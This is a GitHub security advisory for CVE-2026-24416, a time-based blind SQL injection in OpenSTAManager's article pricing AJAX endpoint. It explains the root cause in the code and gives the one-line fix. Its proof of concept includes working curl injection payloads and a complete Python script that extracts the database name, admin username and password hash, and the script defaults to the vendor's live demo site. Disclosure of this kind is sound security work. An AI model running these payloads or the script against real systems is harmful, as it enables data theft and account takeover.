{
  "schema_version": "1.4.0",
  "id": "GHSA-p864-fqgv-92q4",
  "modified": "2026-02-06T18:19:51Z",
  "published": "2026-02-06T18:19:51Z",
  "aliases": [
    "CVE-2026-24416"
  ],
  "summary": "OpenSTAManager has a Time-Based Blind SQL Injection in Article Pricing Module",
  "details": "### Summary\n\nCritical Time-Based Blind SQL Injection vulnerability in the article pricing module of OpenSTAManager v2.9.8 allows authenticated attackers to extract complete database contents including user credentials, customer data, and financial records through time-based Boolean inference attacks.\n\n**Status:** ✅ Confirmed and tested on live instance (v2.9.8) end [demo.osmbusiness.it](https://demo.osmbusiness.it/) (v2.9.7)\n**Vulnerable Parameter:** `idarticolo` (GET)\n**Affected Endpoint:** `/ajax_complete.php?op=getprezzi`\n**Affected Module:** Articoli (Articles/Products)\n\n### Details\n\nOpenSTAManager v2.9.8 contains a critical Time-Based Blind SQL Injection vulnerability in the article pricing completion handler. The application fails to properly sanitize the `idarticolo` parameter before using it in SQL queries, allowing attackers to inject arbitrary SQL commands and extract sensitive data through time-based Boolean inference.\n\n**Vulnerability Chain:**\n\n1. **Entry Point:** `/ajax_complete.php` (Line 27)\n   ```php\n   $op = get('op');\n   $result = AJAX::complete($op);\n   ```\n   The `op` parameter is retrieved but the vulnerability lies in other parameters.\n\n2. **Distribution:** `/src/AJAX.php::complete()` (Line 189)\n   ```php\n   $result = self::getCompleteResults($file, $resource);\n   ```\n\n3. **Execution:** `/src/AJAX.php::getCompleteResults()` (Line 402)\n   ```php\n   require $file;\n   ```\n   Module-specific complete.php files are included.\n\n4. **Vulnerable Parameter:** `/modules/articoli/ajax/complete.php` (Line 26)\n   ```php\n   $idarticolo = get('idarticolo');\n   ```\n   The `idarticolo` parameter is retrieved from GET request.\n\n5. **Vulnerable SQL Query:** `/modules/articoli/ajax/complete.php` (Line 70) **PRIMARY VULNERABILITY**\n   ```php\n   FROM\n       `dt_righe_ddt`\n       INNER JOIN `dt_ddt` ON `dt_ddt`.`id` = `dt_righe_ddt`.`idddt`\n       INNER JOIN `dt_tipiddt` ON `dt_tipiddt`.`id` = `dt_ddt`.`idtipoddt`\n   WHERE\n       `idarticolo`='.$idarticolo.' AND\n       `dt_tipiddt`.`dir`=\"entrata\" AND\n       `idanagrafica`='.prepare($idanagrafica).'\n   ```\n   **Impact:** Direct concatenation of `$idarticolo` without `prepare()`, while `$idanagrafica` is properly sanitized.\n\n**Context - Full Query Structure (Lines 39-74):**\n\nThe vulnerable query is part of a UNION query that fetches pricing history from invoices and delivery notes:\n\n```php\n$documenti = $dbo->fetchArray('\n    SELECT\n        `iddocumento` AS id,\n        \"Fattura\" AS tipo,\n        \"Fatture di vendita\" AS modulo,\n        (`subtotale`-`sconto`)/`qta` AS costo_unitario,\n        ...\n    FROM\n        `co_righe_documenti`\n        INNER JOIN `co_documenti` ON `co_documenti`.`id` = `co_righe_documenti`.`iddocumento`\n        INNER JOIN `co_tipidocumento` ON `co_tipidocumento`.`id` = `co_documenti`.`idtipodocumento`\n    WHERE\n        `idarticolo`='.prepare($idarticolo).' AND ...  # ✓ PROPERLY SANITIZED (Line 54)\nUNION\n    SELECT\n        `idddt` AS id,\n        \"Ddt\" AS tipo,\n        ...\n    FROM\n        `dt_righe_ddt`\n        INNER JOIN `dt_ddt` ON `dt_ddt`.`id` = `dt_righe_ddt`.`idddt`\n        INNER JOIN `dt_tipiddt` ON `dt_tipiddt`.`id` = `dt_ddt`.`idtipoddt`\n    WHERE\n        `idarticolo`='.$idarticolo.' AND   # ✗ VULNERABLE - NO prepare() (Line 70)\n        `dt_tipiddt`.`dir`=\"entrata\" AND\n        `idanagrafica`='.prepare($idanagrafica).'\nORDER BY\n    `id` DESC LIMIT 0,5');\n```\n\n**Root Cause:** Developer used `prepare()` correctly in the first SELECT (Line 54) but forgot to use it in the second SELECT of the UNION query (Line 70), creating an inconsistent security pattern.\n\n### PoC\n\n**Step 1: Login**\n```bash\ncurl -c /tmp/cookies.txt -X POST 'http://localhost:8081/index.php?op=login' \\\n  -d 'username=admin&password=admin'\n```\n\n**Step 2: Verify Vulnerability (Time-Based SLEEP)**\n```bash\n# Test with SLEEP(10)\ntime curl -s -b /tmp/cookies.txt \\\n  \"http://localhost:8081/ajax_complete.php?op=getprezzi&idanagrafica=1&idarticolo=1%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(10)))a)\" \\\n  > /dev/null\n# Result: real 0m10.32s (10.32 seconds)\n\n# Test with SLEEP(3) - should take ~3 seconds\ntime curl -s -b /tmp/cookies.txt \\\n  \"http://localhost:8081/ajax_complete.php?op=getprezzi&idanagrafica=1&idarticolo=1%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(3)))a)\" \\\n  > /dev/null\n# Result: real 0m3.36s (3.36 seconds)\n\n# Test without SLEEP\ntime curl -s -b /tmp/cookies.txt \\\n  \"http://localhost:8081/ajax_complete.php?op=getprezzi&idanagrafica=1&idarticolo=1\" \\\n  > /dev/null\n# Result: real 0m0.31s (0.31 seconds)\n```\n<img width=\"1123\" height=\"536\" alt=\"image\" src=\"https://github.com/user-attachments/assets/4f5c56d8-db60-44dd-a52c-35314be4b4ed\" />\n\n**Step 3: Data Extraction - Database Name**\n```bash\n# Extract first character of database name\n# Test if first char is 'o' (expected: TRUE for 'openstamanager')\ntime curl -s -b /tmp/cookies.txt \\\n  \"http://localhost:8081/ajax_complete.php?op=getprezzi&idanagrafica=1&idarticolo=1%20AND%20SUBSTRING(DATABASE(),1,1)=%27o%27%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)\" \\\n  > /dev/null\n# Result: real 0m2.34s (SLEEP executed - condition TRUE)\n\n# Test if first char is 'x' (expected: FALSE)\ntime curl -s -b /tmp/cookies.txt \\\n  \"http://localhost:8081/ajax_complete.php?op=getprezzi&idanagrafica=1&idarticolo=1%20AND%20SUBSTRING(DATABASE(),1,1)=%27x%27%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)\" \\\n  > /dev/null\n# Result: real 0m0.31s (SLEEP not executed - condition FALSE)\n\n# Extract second character (expected: 'p')\ntime curl -s -b /tmp/cookies.txt \\\n  \"http://localhost:8081/ajax_complete.php?op=getprezzi&idanagrafica=1&idarticolo=1%20AND%20SUBSTRING(DATABASE(),2,1)=%27p%27%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)\" \\\n  > /dev/null\n# Result: real 0m2.34s (SLEEP executed - confirms second char is 'p')\n\n# Extract first 3 characters (expected: 'ope')\ntime curl -s -b /tmp/cookies.txt \\\n  \"http://localhost:8081/ajax_complete.php?op=getprezzi&idanagrafica=1&idarticolo=1%20AND%20SUBSTRING(DATABASE(),1,3)=%27ope%27%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)\" \\\n  > /dev/null\n# Result: real 0m2.33s (SLEEP executed - confirms 'ope...')\n```\n\n**Step 4: Extract Sensitive Data - Admin Credentials**\n```bash\n# Extract admin username (test if first 5 chars are 'admin')\ntime curl -s -b /tmp/cookies.txt \\\n  \"http://localhost:8081/ajax_complete.php?op=getprezzi&idanagrafica=1&idarticolo=1%20AND%20(SELECT%20SUBSTRING(username,1,5)%20FROM%20zz_users%20WHERE%20id=1)=%27admin%27%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)\" \\\n  > /dev/null\n# Result: real 0m2.33s (SLEEP executed - confirms admin username)\n\n# Extract first character of password hash (expected: '$' for bcrypt)\ntime curl -s -b /tmp/cookies.txt \\\n  \"http://localhost:8081/ajax_complete.php?op=getprezzi&idanagrafica=1&idarticolo=1%20AND%20(SELECT%20SUBSTRING(password,1,1)%20FROM%20zz_users%20WHERE%20id=1)=%27%24%27%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)\" \\\n  > /dev/null\n# Result: real 0m2.33s (SLEEP executed - confirms bcrypt hash format)\n```\n\n**Payload Explanation:**\n```\nOriginal payload: 1 AND SUBSTRING(DATABASE(),1,1)='o' AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)\nURL-encoded: 1%20AND%20SUBSTRING(DATABASE(),1,1)=%27o%27%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)\n\nInjection breakdown:\n1. 1 - Valid article ID\n2. AND SUBSTRING(DATABASE(),1,1)='o' - Boolean condition to test\n3. AND (SELECT 1 FROM (SELECT(SLEEP(2)))a) - Execute SLEEP(2) if condition is true\n\nSQL Query Result:\nWHERE\n    `idarticolo`=1\n    AND SUBSTRING(DATABASE(),1,1)='o'\n    AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)\n    AND `dt_tipiddt`.`dir`=\"entrata\"\n    AND `idanagrafica`=1\n```\n\n**Automated Extraction Script Example:**\n```python\nimport requests\nimport time\nimport string\nimport sys\n\n# Default Configuration\nBASE_URL = \"https://demo.osmbusiness.it\"\nUSERNAME = \"demo\"\nPASSWORD = \"demodemo1\"\nSLEEP_TIME = 3  # Increased to 3s for stability on remote demo instance\n\ndef login(session, base_url, user, pwd):\n    \"\"\"Authenticates to the application and maintains session.\"\"\"\n    login_url = f\"{base_url}/index.php?op=login\"\n    data = {\"username\": user, \"password\": pwd}\n    \n    print(f\"[*] Attempting login to: {login_url}...\")\n    try:\n        response = session.post(login_url, data=data, timeout=10)\n        # Check if login was successful (usually indicated by presence of logout link or redirect)\n        if \"logout\" in response.text.lower() or response.status_code == 200:\n            print(\"[+] Login successful!\")\n            return True\n        else:\n            print(\"[-] Login failed. Please check credentials.\")\n            return False\n    except Exception as e:\n        print(f\"[!] Connection error: {e}\")\n        return False\n\ndef extract_data(session, base_url, sql_query, label=\"Data\"):\n    \"\"\"Extracts data character by character until the end of the string is reached.\"\"\"\n    print(f\"\\n[*] Extracting: {label}...\")\n    result = \"\"\n    position = 1\n    target_endpoint = f\"{base_url}/ajax_complete.php\"\n    \n    # Charset optimized for database names and bcrypt hashes ($, ., /)\n    charset = string.ascii_letters + string.digits + \"$./\" + string.punctuation\n\n    while True:\n        found_char = False\n        for char in charset:\n            # Payload: If the condition is true, the server sleeps for SLEEP_TIME\n            # Using ORD() and SUBSTRING() to handle various character types safely\n            payload = f\"1 AND (SELECT 1 FROM (SELECT IF(ORD(SUBSTRING(({sql_query}),{position},1))={ord(char)},SLEEP({SLEEP_TIME}),0))a)\"\n            \n            params = {\n                \"op\": \"getprezzi\",\n                \"idanagrafica\": \"1\",\n                \"idarticolo\": payload\n            }\n\n            try:\n                start_time = time.time()\n                session.get(target_endpoint, params=params, timeout=SLEEP_TIME + 10)\n                elapsed = time.time() - start_time\n\n                if elapsed >= SLEEP_TIME:\n                    result += char\n                    found_char = True\n                    sys.stdout.write(f\"\\r[+] {label} [{position}]: {result}\")\n                    sys.stdout.flush()\n                    break\n            except requests.exceptions.RequestException:\n                # Handle network jitter/timeouts by retrying or continuing\n                continue\n\n        # If no character from charset triggered a sleep, we've reached the end of the data\n        if not found_char:\n            print(f\"\\n[!] End of string or no data found at position {position}.\")\n            break\n            \n        position += 1\n        \n    return result\n\ndef main():\n    s = requests.Session()\n    \n    # Allow target URL to be passed as a command line argument\n    target = sys.argv[1] if len(sys.argv) > 1 else BASE_URL\n    \n    if login(s, target, USERNAME, PASSWORD):\n        # 1. Database name extraction\n        db = extract_data(s, target, \"SELECT DATABASE()\", \"Database Name\")\n        \n        # 2. Admin username extraction\n        user = extract_data(s, target, \"SELECT username FROM zz_users WHERE id=1\", \"Admin Username (id=1)\")\n        \n        # 3. Password hash extraction (Bcrypt hashes are ~60 chars; the loop handles this automatically)\n        pwd_hash = extract_data(s, target, \"SELECT password FROM zz_users WHERE id=1\", \"Password Hash\")\n\n        print(f\"\\n\\n{'='*35}\")\n        print(f\"         FINAL REPORT\")\n        print(f\"{'='*35}\")\n        print(f\"Target URL: {target}\")\n        print(f\"Database:   {db}\")\n        print(f\"Username:   {user}\")\n        print(f\"Hash:       {pwd_hash}\")\n        print(f\"{'='*35}\")\n\nif __name__ == \"__main__\":\n    main()\n```\n<img width=\"674\" height=\"476\" alt=\"image\" src=\"https://github.com/user-attachments/assets/24173485-55a0-4224-9746-48786704bb73\" />\n\n### Impact\n\n\n**Affected Users:** All authenticated users with access to the article pricing functionality (typically users managing quotes, invoices, orders).\n\n**Recommended Fix:**\n\n**File:** `/modules/articoli/ajax/complete.php`\n\n**BEFORE (Vulnerable - Line 70):**\n```php\nWHERE\n    `idarticolo`='.$idarticolo.' AND\n    `dt_tipiddt`.`dir`=\"entrata\" AND\n    `idanagrafica`='.prepare($idanagrafica).'\n```\n\n**AFTER (Fixed):**\n```php\nWHERE\n    `idarticolo`='.prepare($idarticolo).' AND\n    `dt_tipiddt`.`dir`=\"entrata\" AND\n    `idanagrafica`='.prepare($idanagrafica).'\n```\n\n### Credits\nDiscovered by Łukasz Rybak",
  "severity": [
    {
      "type": "CVSS_V4",
      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
    }
  ],
  "affected": [
    {
      "package": {
        "ecosystem": "Packagist",
        "name": "devcode-it/openstamanager"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "last_affected": "2.9.8"
            }
          ]
        }
      ]
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/devcode-it/openstamanager/security/advisories/GHSA-p864-fqgv-92q4"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/devcode-it/openstamanager"
    }
  ],
  "database_specific": {
    "cwe_ids": [
      "CWE-89"
    ],
    "severity": "HIGH",
    "github_reviewed": true,
    "github_reviewed_at": "2026-02-06T18:19:51Z",
    "nvd_published_at": null
  }
}